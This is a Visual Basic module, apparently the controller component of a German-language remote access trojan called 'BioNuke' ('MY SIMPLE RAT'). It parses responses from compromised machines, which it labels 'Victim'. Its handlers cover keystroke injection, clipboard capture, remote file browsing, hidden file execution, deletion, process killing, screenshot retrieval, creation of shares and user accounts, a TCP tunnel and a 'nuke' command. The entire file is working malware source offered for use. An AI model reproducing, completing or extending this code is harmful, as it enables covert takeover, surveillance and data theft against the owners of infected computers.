Attribute VB_Name = "Parser"
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'


Public Sub Parse(ByVal tIndex As String, ByVal tCommand As String, Optional tPara As String)
    On Error Resume Next
    If tCommand = "" Then Exit Sub
    
    Dim Command As String, ReceiveData As String, RemoteIP As String
    Command = tCommand
    ReceiveData = tPara
    RemoteIP = frmMain.wsk(tIndex).RemoteHostIP
    
    Dim temp As Variant
    Dim temp2 As Variant
    
    Select Case Command
        Case CMD_SERVERLOG
            temp = Split(ReceiveData, MasterSplit)
            frmMain.AddIP RemoteIP, temp(0), temp(1), temp(2), "x" & tIndex
        Case CMD_LOGIN
            If ReceiveData = "0" Then
                Status "Passwort wurde nicht angenommen", "UnAuth"
            ElseIf ReceiveData = "1" Then
                Status "Erfolgreich eingeloggt!", "Connected"
                frmMain.StatusBar1.Panels(3) = Server.Servername & " (" & Server.RemIP & ")"
                frmMain.StatusBar1.Panels(4) = "Connected"
                frmMain.ListSvr.Enabled = False
                Server.Connected = True
                frmMain.Button(10) = "Log out"
            ElseIf ReceiveData = "00" Then
                SetDisconnected
                Status "Ausgeloggt", "Idle"
            End If
        Case CMD_CHAT
            If ReceiveData = MasterSplit Then
                frmMain.Button(3).Enabled = True
                frmMain.Button(4).Enabled = False
                frmMain.Button(5).Enabled = True
                Status "Chat gestartet", "Idle"
            ElseIf ReceiveData = MasterSplit & MasterSplit Then
                frmMain.Button(3).Enabled = False
                frmMain.Button(4).Enabled = True
                frmMain.Button(5).Enabled = False
                Status "Chat geschlossen", "Idle"
            Else
                frmMain.Text(8) = frmMain.Text(8) & ReceiveData & vbCrLf
            End If
        Case CMD_SENDKEYS
            Status "Tasten wurden simuliert!", "Idle"
        Case CMD_INPUTBOX
            frmMain.Text(14).Text = ReceiveData
            Status "Fragebox beantwortet", "Idle"
        Case CMD_MSG
            Status "Nachricht gesendet", "Idle"
        Case CMD_FAV
            If InStr(ReceiveData, ":") Then
                frmMain.List(2).Clear
                frmMain.ListFavs.Clear
                temp = Split(ReceiveData, MasterSplit & MasterSplit)
                For ii = 0 To UBound(temp)
                    temp2 = Split(temp(ii), MasterSplit)
                    frmMain.List(2).AddItem Left(FileOnly(temp2(0)), Len(FileOnly(temp2(0))) - 4)
                    frmMain.ListFavs.AddItem temp(ii)
                Next ii
                frmMain.Label(28) = "Anzahl: " & UBound(temp)
                Status "Favoriten empfangen", "Idle":
            ElseIf ReceiveData = MasterSplit Then
                Status "Favorit neu angelegt", "Idle"
            ElseIf ReceiveData = MasterSplit & MasterSplit Then
                Status "Favorit gelöscht", "Idle"
            ElseIf ReceiveData = MasterSplit & MasterSplit & MasterSplit Then
                Status "Favoriten-Ziel geändert", "Idle"
            End If
        Case CMD_SERVICES
            temp = Split(ReceiveData, MasterSplit)
            frmMain.List(3).Clear
            For ii = 0 To UBound(temp) - 1
                frmMain.List(3).AddItem temp(ii)
            Next ii
            frmMain.Label(29) = "Anzahl: " & UBound(temp) - 1
            Status "Services empfangen", "Idle"
        Case CMD_SHARE
            temp = Split(ReceiveData, MasterSplit & MasterSplit)
            frmMain.List(4).Clear
            For ii = 0 To UBound(temp)
                temp2 = Split(temp(ii), MasterSplit)
                frmMain.List(4).AddItem temp2(0) & " (" & temp2(1) & ")"
            Next ii
            Status "Freigaben empfangen", "Idle"
        Case CMD_USER
            temp = Split(ReceiveData, MasterSplit)
            frmMain.List(5).Clear
            For ii = 0 To UBound(temp)
                frmMain.List(5).AddItem temp(ii)
            Next ii
            Status "Benutzerkonten empfangen", "Idle"
        Case CMD_SHARE2
            If ReceiveData <> MasterSplit Then
                Status "Freigabe eingerichtet", "Idle"
            Else
                Status "Freigabe gelöscht", "Idle"
            End If
        Case CMD_USER2
            If ReceiveData <> MasterSplit Then
                Status "Benutzer eingerichtet", "Idle"
            Else
                Status "Benutzer gelöscht", "Idle"
            End If
        Case CMD_PRINT
            Status "Text erfolgreich gedruckt!", "Idle"
        Case CMD_CLIP
            If ReceiveData = MasterSplit Then
                Status "Zwischenablage gesetzt!", "Idle"
            Else
                frmMain.Text(32).Text = ReceiveData
                Status "Zwischenablage empfangen", "Idle"
            End If
        Case CMD_FILE
            If Left(ReceiveData, 4) = MasterSplit & "*" Then
                temp = Split(Mid(ReceiveData, 5), MasterSplit)
                frmMain.Combo(4).Clear
                For ii = 0 To UBound(temp) - 1
                    frmMain.Combo(4).AddItem UCase(temp(ii))
                    frmMain.Combo(4).ListIndex = 0
                Next ii
                Status "Laufwerke empfangen", "Idle"
            ElseIf Left(ReceiveData, 4) = MasterSplit & "#" Then
                If Len(Mid(ReceiveData, 5)) = 1 Or Len(Mid(ReceiveData, 5)) = 0 Then
                    Status "Laufwerk nicht bereit.", "Idle"
                Else
                    temp = Split(Mid(ReceiveData, 5), MasterSplit)
                    Status "Laufwerkinfos empfangen", "Idle"
                    MsgBox "Informationen für das Laufwerk" & vbCrLf & "----------------------------------" & vbCrLf & _
                            "Gesamtgröße: " & temp(0) & " Bytes" & vbCrLf & _
                            "Bereit: " & temp(1) & vbCrLf & _
                            "Dateisystem: " & temp(2) & "" & vbCrLf & _
                            "Freier Speicher: " & temp(3) & " Bytes" & vbCrLf & _
                            "Typ: " & Replace(Replace(Replace(Replace(Replace(Replace(temp(4), "0", "Unbekanntes Medium"), "1", "Wechseldatenträger"), "2", "Fester Datenträger"), "3", "Netzlaufwerk"), "4", "CD-Rom"), "5", "RAM") & vbCrLf & _
                            "", vbInformation
                End If
            Else
                frmMain.ListFile.ListItems.Clear
                
                    
                If ReceiveData = "" Then
                    Status "Kein Zugriff", "Idle"
                    DoEvents
                    If Len(frmMain.Text(30)) <> 3 Then
                        Senden Server.Index, CMD_FILE & PathBack(frmMain.Text(30))
                    End If
                    frmMain.Text(30) = PathBack(frmMain.Text(30)): DoEvents
                ElseIf ReceiveData = MasterSplit Then
                    frmMain.ListFile.ListItems.Add , , "Zurück", , 12
                    Status "Kein Eintrag vorhanden", "Idle"
                Else
                    temp = Split(ReceiveData, MasterSplit)
                    If Len(frmMain.Text(30)) <> 3 Then
                        frmMain.ListFile.ListItems.Add , , "Zurück", , 12
                    End If
                    For ii = 0 To UBound(temp)
                        If temp(ii) <> "" Then
                            If Left(temp(ii), 1) = ":" Then
                                frmMain.ListFile.ListItems.Add , , Mid(temp(ii), 2), , 11
                            Else
                                frmMain.ListFile.ListItems.Add , , temp(ii), , FileMime(temp(ii))
                            End If
                        End If
                    Next ii
                    If UBound(temp) <> 1 Then
                        frmMain.Label(6) = UBound(temp) & " Objekte vorhanden."
                    Else
                        frmMain.Label(6) = UBound(temp) & " Objekt vorhanden."
                    End If
                    Status "Dateisystem empfangen", "Idle"
                End If
            End If
        Case CMD_FILEMOD
            temp = Split(ReceiveData, MasterSplit)
            Select Case temp(0)
                Case 1: If temp(1) = 1 Then Status "Datei gestartet!", "Idle" Else Status "Fehler beim Starten der Datei...", "Idle"
                Case 2: If temp(1) = 1 Then Status "Datei (versteckt) gestartet!", "Idle" Else Status "Fehler beim Starten der Datei...", "Idle"
                Case 3: Status "Erfolgreich umbenannt!", "Idle"
                Case 4: If temp(1) = 1 Then Status "Datei erfolgreich gelöscht!", "Idle" Else Status "Fehler beim Löschen der Datei...", "Idle"
                Case 5: Status "Bild erfolgreich gedruckt!", "Idle"
                Case 8: Status "Dateigröße: " & ByteToKB(temp(1)) & " KB", "Idle"
                Case 9: Status "Bild angezeigt", "Idle"
                Case 10: Status "Neuer Hintergrund gesetzt", "Idle"
                Case 11: Status "Ordner erstellt!", "Idle"
            End Select
        Case CMD_PROCESS
            If ReceiveData = MasterSplit Then
                Status "Prozess abgeschossen!", "Idle"
            Else
                frmMain.ListProcess.ListItems.Clear
                temp = Split(ReceiveData, MasterSplit & MasterSplit)
                For ii = 0 To UBound(temp)
                    temp2 = Split(temp(ii), MasterSplit)
                    Set lItem = frmMain.ListProcess.ListItems.Add(, "k" & ii, temp2(0), , 4)
                    lItem.ListSubItems.Add , , Replace(Replace(Replace(Replace(temp2(1), "0", "Idle"), "1", "Normal"), "2", "Echtzeit"), "3", "Hoch")
                    lItem.ListSubItems.Add , , temp2(2)
                Next ii
            End If
            Status "Prozesse aufgelistet", "Idle"
            frmMain.Label(41) = "Anzahl: " & UBound(temp)
        Case CMD_SERVERINFO
            temp = Split(ReceiveData, MasterSplit)
            frmMain.Text(31) = "Version: BioNuke " & temp(0) & vbCrLf & _
                               "Pfad: " & temp(1) & vbCrLf & _
                               "EXE-Name: " & temp(2) & ".exe" & vbCrLf & _
                               "Index: " & temp(3) & vbCrLf & _
                               "IPs: " & temp(4) & vbCrLf & _
                               "Victim: " & temp(5) & vbCrLf & _
                               "Servername: " & temp(6) & vbCrLf & _
                               "Lokaler Port: " & temp(7) & vbCrLf & _
                               "Server Port: " & temp(8) & vbCrLf & _
                               "Serverzeit: " & temp(9) & vbCrLf & _
                               "Servergröße: " & temp(10) & " Bytes" & vbCrLf & _
                               "Lokale Serverip: " & temp(11)
            Status "Serverinfos erhalten!", "Idle"
        Case CMD_TELNET
            temp = Split(ReceiveData, MasterSplit)
            Select Case temp(0)
                Case "1": frmMain.Text(34) = frmMain.Text(34) & vbCrLf & "*** Verbindungsaufbau...": Status "TCP-Tunnel wird aufgebaut", "Idle"
                Case "2": frmMain.Text(34) = frmMain.Text(34) & vbCrLf & "*** Verbindung vom Client getrennt": Status "TCP-Tunnel geschlossen", "Idle"
                Case "4": frmMain.Text(34) = frmMain.Text(34) & vbCrLf & "*** Verbindungsfehler": Status "TCP-Tunnel geschlossen!", "Idle"
                Case "5": frmMain.Text(34) = frmMain.Text(34) & vbCrLf & "*** Verbindung vom Server getrennt": Status "TCP-Tunnel geschlossen!", "Idle"
                Case "6": frmMain.Text(34) = frmMain.Text(34) & vbCrLf & "[" & Time & "] [SERVER] " & Replace(temp(1), vbCrLf, "")
                Case "7": frmMain.Text(34) = frmMain.Text(34) & vbCrLf & "*** Verbindung hergestellt!"
            End Select
        Case CMD_NUKE
            Status "Computer wurde genuked!", "Idle"
        Case CMD_DOWNLOAD
            frmTransfer.Label(7).Caption = ByteToKB(ReceiveData) & " KB"
            frmTransfer.Label(7).Tag = ReceiveData
            frmTransfer.ProgressBar.Max = ReceiveData
        Case CMD_DELDIR
            If ReceiveData = "1" Then
                Status "Ordner gelöscht", "Idle"
            Else
                Status "Ordner muss leer sein", "Idle"
            End If
        Case CMD_SCREEN
            frmTransfer.AddDownload ReceiveData
            Status "Screenshot wird empfangen", "Idle"
    End Select
End Sub
Public Function FileOnly(ByVal tPath As String) As String
    On Error Resume Next: Dim sPath As Variant: sPath = Split(Replace(tPath, "/", "\"), "\"): FileOnly = sPath(UBound(sPath))
End Function

Public Sub SetDisconnected()
    On Error Resume Next
    Server.Connected = False
    frmMain.StatusBar1.Panels(3) = "Disconnected"
    frmMain.StatusBar1.Panels(4) = "Disconnected"
    frmMain.ListSvr.Enabled = True
    frmMain.Button(10) = "Login"
End Sub
Public Sub Senden(ByVal tIndex As Integer, ByVal tData As String)
    On Error Resume Next
    If InStr(tData, CMD_LOGIN) = 0 And Server.Connected = False Then
        Status "Keine Verbindung erkannt", "Error"
    Else
        frmMain.wsk(tIndex).SendData Encode(tData)
    End If
End Sub
